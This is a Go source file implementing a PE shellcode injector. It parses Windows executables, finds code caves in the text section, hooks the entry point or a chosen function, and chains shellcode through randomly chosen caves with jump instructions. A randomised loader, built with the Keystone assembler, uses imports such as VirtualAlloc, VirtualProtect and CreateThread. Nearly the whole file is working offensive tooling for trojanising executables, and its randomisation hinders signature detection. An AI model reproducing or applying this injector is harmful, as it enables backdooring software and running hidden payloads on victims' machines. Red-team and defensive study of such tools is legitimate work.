package injector

import (
	"bytes"
	cr "crypto/rand"
	"debug/pe"
	"encoding/binary"
	"errors"
	"fmt"
	"math/rand"
	"strings"
	"time"

	"github.com/For-ACGN/go-keystone"
)

// Injector is a simple PE injector for inject shellcode.
type Injector struct {
	seed int64
	rand *rand.Rand

	// assembler engine
	engine *keystone.Engine

	// context arguments
	opts *Options
	arch string
	dup  []byte

	// about pe image
	img   *pe.File
	hdr32 *pe.OptionalHeader32
	hdr64 *pe.OptionalHeader64

	// about process IAT
	vm  []byte
	iat []*iat

	// about hook function
	oriInst [][]byte
	retRVA  uint32

	// for replace stub in loader
	procCreateThread   *iat
	procVirtualAlloc   *iat
	procVirtualProtect *iat
	procLoadLibraryA   *iat
	procLoadLibraryW   *iat
	procGetProcAddress *iat

	// for write shellcode loader
	caves []*codeCave

	// for select random register
	regBox []string
}

// Options contains options about inject shellcode.
type Options struct {
	// specify the target function address that will
	// be hooked, it is an VA address, not a file offset
	// or RVA, remember disable ASLR when debug image.
	// if it is zero, use the entry point
	Address uint64

	// specify a random seed for generate loader
	RandSeed int64

	// specify the x86 loader template
	LoaderX86 string

	// specify the x64 loader template
	LoaderX64 string
}

// NewInjector is used to create a simple PE injector.
func NewInjector() *Injector {
	var seed int64
	buf := make([]byte, 8)
	_, err := cr.Read(buf)
	if err == nil {
		seed = int64(binary.LittleEndian.Uint64(buf)) // #nosec G115
	} else {
		seed = time.Now().UTC().UnixNano()
	}
	rng := rand.New(rand.NewSource(seed)) // #nosec
	injector := Injector{
		seed: rng.Int63(),
		rand: rng,
	}
	return &injector
}

// Inject is used to inject shellcode to a PE image.
func (inj *Injector) Inject(image, shellcode []byte, opts *Options) ([]byte, error) {
	if len(shellcode) == 0 {
		return nil, errors.New("empty shellcode")
	}
	err := inj.preprocess(image, opts)
	if err != nil {
		return nil, err
	}
	// initialize keystone engine
	err = inj.initAssembler()
	if err != nil {
		return nil, fmt.Errorf("failed to initialize assembler: %s", err)
	}
	defer func() {
		_ = inj.engine.Close()
		inj.engine = nil
	}()
	// build shellcode loader
	loader, err := inj.buildShellcodeLoader()
	if err != nil {
		return nil, fmt.Errorf("failed to build loader: %s", err)
	}
	err = inj.inject(loader)
	if err != nil {
		return nil, fmt.Errorf("failed to inject loader: %s", err)
	}
	output := inj.dup
	inj.cleanup()
	return output, nil
}

// InjectSegment is used to inject shellcode segment to a PE image.
// It is an advanced usage, you must ensure each instruction in
// segment are position-independent.
func (inj *Injector) InjectSegment(image []byte, shellcode [][]byte, opts *Options) ([]byte, error) {
	if len(shellcode) == 0 {
		return nil, errors.New("empty shellcode segment")
	}
	err := inj.preprocess(image, opts)
	if err != nil {
		return nil, err
	}
	err = inj.inject(shellcode)
	if err != nil {
		return nil, fmt.Errorf("failed to inject shellcode segment: %s", err)
	}
	output := inj.dup
	inj.cleanup()
	return output, nil
}

func (inj *Injector) inject(shellcode [][]byte) error {
	if len(shellcode) < 2 {
		return errors.New("shellcode must contain at least two instructions")
	}
	if len(shellcode) > len(inj.caves) {
		return errors.New("not enough caves to inject shellcode")
	}
	var entryPoint uint32
	switch inj.arch {
	case "386":
		entryPoint = inj.hdr32.AddressOfEntryPoint
	case "amd64":
		entryPoint = inj.hdr64.AddressOfEntryPoint
	}
	var targetRVA uint32
	if inj.opts.Address != 0 {
		targetRVA = inj.vaToRVA(inj.opts.Address)
	} else {
		targetRVA = entryPoint
	}
	// search a cave near the entry point
	var first *codeCave
	for i, cave := range inj.caves {
		offset := int64(cave.virtualAddr) - int64(entryPoint)
		if offset <= 4096 && offset >= -4096 {
			first = cave
			inj.removeCodeCave(i)
			break
		}
	}
	// if failed to search target, random select a cave
	if first == nil {
		i := inj.rand.Intn(len(inj.caves))
		first = inj.caves[i]
		inj.removeCodeCave(i)
	}
	// hook target function
	err := inj.hook(targetRVA, first)
	if err != nil {
		return err
	}

	current := first
	next := inj.selectCodeCave()
	for i := 0; i < len(shellcode); i++ {
		size := len(shellcode[i])
		if size+5 > current.size {
			return errors.New("appear too large instruction in shellcode")
		}
		var rel int64
		if i != len(shellcode)-1 {
			rel = int64(next.virtualAddr) - int64(current.virtualAddr+uint32(size)) - 5
		} else {
			rel = int64(entryPoint) - int64(current.virtualAddr+uint32(size)) - 5
		}
		jmp := make([]byte, 5)
		jmp[0] = 0xE9
		binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
		inst := append([]byte{}, shellcode[i]...)
		inst = append(inst, jmp...)
		copy(inj.dup[current.pointerToRaw:], inst)
		// update status
		current = next
		next = inj.selectCodeCave()
	}
	// overwrite original entry point
	peOffset := binary.LittleEndian.Uint32(inj.dup[imageDOSHeader-4:])
	hdrOffset := peOffset + 4 + imageFileHeaderSize
	binary.LittleEndian.PutUint32(inj.dup[hdrOffset+offsetToEntryPoint:], first.virtualAddr)
	return nil
}

func (inj *Injector) preprocess(image []byte, opts *Options) error {
	if opts == nil {
		opts = new(Options)
	}
	inj.opts = opts
	// check image architecture
	peFile, err := pe.NewFile(bytes.NewReader(image))
	if err != nil {
		return err
	}
	var arch string
	switch peFile.Machine {
	case pe.IMAGE_FILE_MACHINE_I386:
		arch = "386"
		inj.hdr32 = peFile.OptionalHeader.(*pe.OptionalHeader32)
	case pe.IMAGE_FILE_MACHINE_AMD64:
		arch = "amd64"
		inj.hdr64 = peFile.OptionalHeader.(*pe.OptionalHeader64)
	default:
		return errors.New("unknown pe image architecture type")
	}
	inj.img = peFile
	inj.arch = arch
	inj.loadImage(image)
	// scan code cave in image text section
	err = inj.scanCodeCave()
	if err != nil {
		return fmt.Errorf("failed to scan code cave: %s", err)
	}
	// set random seed
	seed := opts.RandSeed
	if seed == 0 {
		seed = inj.rand.Int63()
	}
	inj.rand.Seed(seed)
	// record the last seed
	inj.seed = seed
	// make duplicate for make output image
	dup := make([]byte, len(image))
	copy(dup, image)
	inj.dup = dup
	return nil
}

func (inj *Injector) initAssembler() error {
	var err error
	switch inj.arch {
	case "386":
		inj.engine, err = keystone.NewEngine(keystone.ARCH_X86, keystone.MODE_32)
	case "amd64":
		inj.engine, err = keystone.NewEngine(keystone.ARCH_X86, keystone.MODE_64)
	}
	if err != nil {
		return err
	}
	return inj.engine.Option(keystone.OPT_SYNTAX, keystone.OPT_SYNTAX_INTEL)
}

func (inj *Injector) assemble(src string) ([]byte, error) {
	if strings.Contains(src, "<no value>") {
		return nil, errors.New("invalid register in assembly source")
	}
	return inj.engine.Assemble(src, 0)
}

func (inj *Injector) selectCodeCave() *codeCave {
	i := inj.rand.Intn(len(inj.caves))
	cave := inj.caves[i]
	inj.removeCodeCave(i)
	return cave
}

func (inj *Injector) removeCodeCave(i int) {
	inj.caves = append(inj.caves[:i], inj.caves[i+1:]...)
}

func (inj *Injector) cleanup() {
	inj.img = nil
	inj.dup = nil
	inj.caves = nil
}

// Seed is used to get the random seed for debug.
func (inj *Injector) Seed() int64 {
	return inj.seed
}

// Close is used to close pe injector.
func (inj *Injector) Close() error {
	if inj.engine == nil {
		return nil
	}
	return inj.engine.Close()
}
